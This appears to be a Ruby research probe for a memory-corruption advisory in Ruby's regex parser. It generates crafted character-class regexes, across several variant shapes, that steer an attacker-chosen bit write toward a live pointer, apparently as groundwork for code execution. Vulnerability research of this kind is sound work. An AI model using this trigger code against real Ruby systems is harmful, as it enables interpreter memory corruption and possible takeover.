#!/usr/bin/env ruby
# GHSA-7whj-cfh7-xgm4 shape probe: does an ASCII/US-ASCII character class
# reach the attacker-chosen one-bit OR at regparse.c:4589 with a non-NULL
# CClassNode.mbuf, so that the write steers a live pointer instead of a NULL?
#
# Usage: ruby ruby2shell-tos-mbuf-shapes.rb HEX_CODEPOINT SHAPE
#        TOS_CODE=100 TOS_SHAPE=neg_w ruby ruby2shell-tos-mbuf-shapes.rb
# All shapes use ASCII-only source bytes, so the regexp encoding stays
# US-ASCII and \x{CODE} above 0xff is parsed as CCV_SB in 3.4.12.
hex = ARGV[0] || ENV.fetch('TOS_CODE')
shape = ARGV[1] || ENV.fetch('TOS_SHAPE', 'base')
v = format('%X', Integer(hex, 16))

# The comment wrapper is required: 3.4.12's first parse validates \x{100}
# and rejects it, while rb_reg_str_with_term's reparse does not.
inner = case shape
        when 'base'        then ''
        when 'neg_w'       then '\\W'
        when 'neg_d'       then '\\D'
        when 'word'        then '\\w'
        when 'posix_neg'   then '[:^alpha:]'
        when 'charprop'    then '\\p{Alpha}'
        when 'intersect'   then '&&\\w'
        when 'negated'     then ''
        when 'nested'      then '[a-z]'
        when 'range'       then '-\\x{10FFFF}'
        when 'two_vals'    then '\\x{41}'
        when 'ascii_range' then ''
        when 'utf8'        then '\\u00e9'
        else abort "unknown shape: #{shape}"
        end
src = "(?:[](?#\\x{#{v}})#{inner}])"
src = "(?:[^](?#\\x{#{v}})#{inner}])" if shape == 'negated'
src = "(?a:#{src})" if shape == 'ascii_range'
begin
  re = Regexp.new(src)
rescue RegexpError => e
  puts "REGEXPERROR #{e.message.lines.first.strip}"
  exit 0
end
puts re.to_s.inspect
